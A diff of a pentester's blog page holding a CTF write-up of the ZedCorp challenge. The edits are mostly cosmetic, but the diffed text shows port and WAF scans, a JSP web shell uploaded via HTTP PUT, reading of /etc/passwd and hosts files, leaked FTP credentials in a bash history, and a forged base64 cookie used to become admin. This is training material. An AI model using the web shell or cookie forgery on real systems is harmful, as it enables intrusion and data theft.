@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.92.1" />
+<meta name="generator" content="Hugo 0.121.2">
 
   <meta property="og:title" content="[CTF - Hacklab-ESGI-2019] ZedCorp Challenge - My name is Rookie" />
 <meta property="og:description" content="" />
@@ -44,7 +44,6 @@
   <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
 
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
 
     
   
@@ -105,9 +104,9 @@
 	
 
     <h1 class="brand-title">Thibaud Robin</h1>
-    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">@Trackflaw</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity</p>
+    <p>Personnal (old) blog to speak about cybersecurity</p>
 
     <nav class="nav">
       <ul class="nav-list sidebar-list">
@@ -126,7 +125,7 @@
     <div class="social-buttons">
       
         
-        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        <a href="https://github.com/trackflaw" target="_blank"><i class='fab fa-github'></i></a>
         
       
         
@@ -142,7 +141,7 @@
         
       
         
-        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        <a href="https://twitter.com/trackflaw" target="_blank"><i class='fab fa-twitter'></i></a>
         
       
       
@@ -232,22 +231,22 @@
 <pre tabindex="0"><code>http = ctf.hacklab-esgi.org:5008 
 ssh = ctf.hacklab-esgi.org:5007
 </code></pre><p>First thing to do is to collect some informations about the target. Let&rsquo;s launch a port scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ sudo nmap -v -A -O -sT 192.168.122.22
-
-Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-03-21 16:22 CET
-
-Discovered open port 22/tcp on 192.168.122.22
-Discovered open port 80/tcp on 192.168.122.22
-
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey: 
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
-|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
-|_http-title: <span style="color:#ae81ff">403</span> Forbidden
-</code></pre></div><p>The scan return severals informations :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ sudo nmap -v -A -O -sT 192.168.122.22
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-03-21 16:22 CET
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.122.22
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.122.22
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span></code></pre></div><p>The scan return severals informations :</p>
 <ul>
 <li>
 <p>2 ports are open :</p>
@@ -261,24 +260,24 @@ PORT   STATE SERVICE VERSION
 </li>
 </ul>
 <p>Nmap return <code>http-title: 403 Forbidden</code> which could indicate that the web server is under WAF or something else who block request from nmap useragent. Let&rsquo;s check.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ wafw00f 192.168.122.22 
-
-                                 ^     ^
-        _   __  _   ____ _   __  _    _   ____
-       ///7/ /.<span style="color:#e6db74">&#39; \ / __////7/ /,&#39;</span> <span style="color:#ae81ff">\ </span>,<span style="color:#e6db74">&#39; \ / __/
-</span><span style="color:#e6db74">      | V V // o // _/ | V V // 0 // 0 // _/
-</span><span style="color:#e6db74">      |_n_,&#39;</span>/_n_//_/   |_n_,<span style="color:#e6db74">&#39; \_,&#39;</span> <span style="color:#ae81ff">\_</span>,<span style="color:#e6db74">&#39;/_/
-</span><span style="color:#e6db74">                                &lt;
-</span><span style="color:#e6db74">                                ...&#39;</span>
-
-    WAFW00F - Web Application Firewall Detection Tool
-
-    By Sandro Gauci <span style="color:#f92672">&amp;&amp;</span> Wendel G. Henrique
-
-Checking http://192.168.122.22
-The site http://192.168.122.22 is behind a ModSecurity <span style="color:#f92672">(</span>OWASP CRS<span style="color:#f92672">)</span>
-Number of requests: <span style="color:#ae81ff">11</span>
-</code></pre></div><p>Indeed the web server is behind a ModSecurity.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ wafw00f 192.168.122.22 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                 ^     ^
+</span></span><span style="display:flex;"><span>        _   __  _   ____ _   __  _    _   ____
+</span></span><span style="display:flex;"><span>       ///7/ /.<span style="color:#e6db74">&#39; \ / __////7/ /,&#39;</span> <span style="color:#ae81ff">\ </span>,<span style="color:#e6db74">&#39; \ / __/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      | V V // o // _/ | V V // 0 // 0 // _/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_n_,&#39;</span>/_n_//_/   |_n_,<span style="color:#e6db74">&#39; \_,&#39;</span> <span style="color:#ae81ff">\_</span>,<span style="color:#e6db74">&#39;/_/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                &lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                ...&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WAFW00F - Web Application Firewall Detection Tool
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    By Sandro Gauci <span style="color:#f92672">&amp;&amp;</span> Wendel G. Henrique
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Checking http://192.168.122.22
+</span></span><span style="display:flex;"><span>The site http://192.168.122.22 is behind a ModSecurity <span style="color:#f92672">(</span>OWASP CRS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Number of requests: <span style="color:#ae81ff">11</span>
+</span></span></code></pre></div><p>Indeed the web server is behind a ModSecurity.</p>
 <p>The website is ostensibly a simple one page statice website under construction</p>
 <p><img src="/img/hacklab-esgi-2019/1.png" alt="website"></p>
 <p>First thing to do is to launch an application scan to do a first analyse.</p>
@@ -295,7 +294,7 @@ Number of requests: <span style="color:#ae81ff">11</span>
 + The anti-clickjacking X-Frame-Options header is not present.
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ All CGI directories 'found', use '-C none' to test none
++ All CGI directories &#39;found&#39;, use &#39;-C none&#39; to test none
 + OSVDB-3268: /logs/: Directory indexing found.
 + OSVDB-3092: /logs/: This might be interesting...
 </code></pre><p>Nikto detect a directory with content readable.</p>
@@ -552,11 +551,11 @@ Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,pl;q=0.6
 Connection: close
 Content-Length: 4
 
-&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
+&lt;%@ page import=&#34;java.util.*,java.io.*&#34;%&gt;
 &lt;%
-	if (request.getParameter(&quot;cmd&quot;) != null) {
-		out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;br&gt;&quot;);
-		Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+	if (request.getParameter(&#34;cmd&#34;) != null) {
+		out.println(&#34;Command: &#34; + request.getParameter(&#34;cmd&#34;) + &#34;&lt;br&gt;&#34;);
+		Process p = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));
 		OutputStream os = p.getOutputStream();
 		InputStream in = p.getInputStream();
 		DataInputStream dis = new DataInputStream(in);
@@ -579,60 +578,60 @@ Content-Length: 4
 <p><img src="/img/hacklab-esgi-2019/27.png" alt=""></p>
 <h1 id="step-8--bash-history-permission-mistake">Step 8 : Bash history permission mistake</h1>
 <p>Let&rsquo;s check some classic files</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@project-server:/home$ cat /etc/passwd
-cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-_apt:x:104:65534::/nonexistent:/bin/false
-messagebus:x:105:109::/var/run/dbus:/bin/false
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-tomcat:x:1001:1001::/opt/tomcat:/bin/false
-fdaigle:x:1000:1000:Frederic Daigle,6,03.32.53.60.97,03.32.53.60.97,CEO:/home/fdaigle:/bin/bash
-dcloutier:x:1002:1002:Daniel Cloutier,3,01.13.79.95.54,01.13.79.95.54,Sysadmin and project manager:/home/dcloutier:/bin/bash
-csouplet:x:1003:1003:Charlotte Souplet,2,03.02.69.97.28,03.02.69.97.28,Frontend developer:/home/csouplet:/bin/bash
-trobin:x:1004:1004:Thibaud Robin,8,01.45.67.43.56,01.45.67.43.56,Trainee full stack developer:/home/trobin:/bin/bash
-
-
-tomcat@project-server:/home$ cat /etc/hosts
-cat /etc/hosts
-127.0.0.1	localhost
-127.0.1.1	project-server
-
-10.0.0.1	dev-server 		dev-server.zedcorp
-10.0.0.2	project-server	project-server.zedcorp
-10.0.0.3	admin-server	admin-server.zedcorp
-
-<span style="color:#75715e"># The following lines are desirable for IPv6 capable hosts</span>
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-
-
-tomcat@project-server:/home$ cat /etc/resolv.conf
-cat /etc/resolv.conf
-search zedcorp
-nameserver 10.0.0.1
-</code></pre></div><p>We have new users of ZedCorp company. Let&rsquo;s check their home.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tomcat@project-server:/home$ cat /etc/passwd
+</span></span><span style="display:flex;"><span>cat /etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span style="display:flex;"><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span style="display:flex;"><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>_apt:x:104:65534::/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>messagebus:x:105:109::/var/run/dbus:/bin/false
+</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tomcat:x:1001:1001::/opt/tomcat:/bin/false
+</span></span><span style="display:flex;"><span>fdaigle:x:1000:1000:Frederic Daigle,6,03.32.53.60.97,03.32.53.60.97,CEO:/home/fdaigle:/bin/bash
+</span></span><span style="display:flex;"><span>dcloutier:x:1002:1002:Daniel Cloutier,3,01.13.79.95.54,01.13.79.95.54,Sysadmin and project manager:/home/dcloutier:/bin/bash
+</span></span><span style="display:flex;"><span>csouplet:x:1003:1003:Charlotte Souplet,2,03.02.69.97.28,03.02.69.97.28,Frontend developer:/home/csouplet:/bin/bash
+</span></span><span style="display:flex;"><span>trobin:x:1004:1004:Thibaud Robin,8,01.45.67.43.56,01.45.67.43.56,Trainee full stack developer:/home/trobin:/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tomcat@project-server:/home$ cat /etc/hosts
+</span></span><span style="display:flex;"><span>cat /etc/hosts
+</span></span><span style="display:flex;"><span>127.0.0.1	localhost
+</span></span><span style="display:flex;"><span>127.0.1.1	project-server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>10.0.0.1	dev-server 		dev-server.zedcorp
+</span></span><span style="display:flex;"><span>10.0.0.2	project-server	project-server.zedcorp
+</span></span><span style="display:flex;"><span>10.0.0.3	admin-server	admin-server.zedcorp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The following lines are desirable for IPv6 capable hosts</span>
+</span></span><span style="display:flex;"><span>::1     localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1 ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2 ip6-allrouters
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tomcat@project-server:/home$ cat /etc/resolv.conf
+</span></span><span style="display:flex;"><span>cat /etc/resolv.conf
+</span></span><span style="display:flex;"><span>search zedcorp
+</span></span><span style="display:flex;"><span>nameserver 10.0.0.1
+</span></span></code></pre></div><p>We have new users of ZedCorp company. Let&rsquo;s check their home.</p>
 <p>Let&rsquo;s check user home like the kanbans task said.</p>
 <pre tabindex="0"><code>tomcat@project-server:/$ cd /home
 cd /home
@@ -733,9 +732,9 @@ tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz
 tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz --pass pass:daniel2019
 ls -al
 cat credentials.txt 
-lftp -u 'backup,46t5r2e5t&amp;2z!' admin-server
-lftp -c 'open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / credentials.tar.gz' 
-lftp -c 'open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / ~/credentials.tar.gz' 
+lftp -u &#39;backup,46t5r2e5t&amp;2z!&#39; admin-server
+lftp -c &#39;open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / credentials.tar.gz&#39; 
+lftp -c &#39;open -u backup,46t5r2e5t&amp;2z! admin-server; put -O / ~/credentials.tar.gz&#39; 
 ftp admin-server
 cat TODO.txt 
 l
@@ -819,11 +818,11 @@ CREDENTIALS
 <p>Let&rsquo;s check requests captured by burp.</p>
 <p><img src="/img/hacklab-esgi-2019/35.png" alt=""></p>
 <p>There is some cookies. Look at this strange cookie <code>status</code>. He has the value <code>admin</code> encoded in base64. Do you think the application check user status with this status ? Let&rsquo;s check with <code>ceo</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;YWRtaW4=&#34;</span> | base64 -d
-admin
-<span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo -n <span style="color:#e6db74">&#34;ceo&#34;</span> | base64
-Y2Vv
-</code></pre></div><p><img src="/img/hacklab-esgi-2019/36.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;YWRtaW4=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo -n <span style="color:#e6db74">&#34;ceo&#34;</span> | base64
+</span></span><span style="display:flex;"><span>Y2Vv
+</span></span></code></pre></div><p><img src="/img/hacklab-esgi-2019/36.png" alt=""></p>
 <p>Welcome Frederic ! We win ! We are the CEO !</p>
 <p><img src="/img/hacklab-esgi-2019/38.png" alt=""></p>
 <h1 id="step-12--download-confidential-projects">Step 12 : Download confidential projects</h1>
@@ -852,7 +851,7 @@ Y2Vv
 		</ul>
 	</div>
 
-	<p>&copy; 2022. All rights reserved.</p>
+	<p>&copy; 2024. All rights reserved.</p>
 </div>
     </div>
   </div>
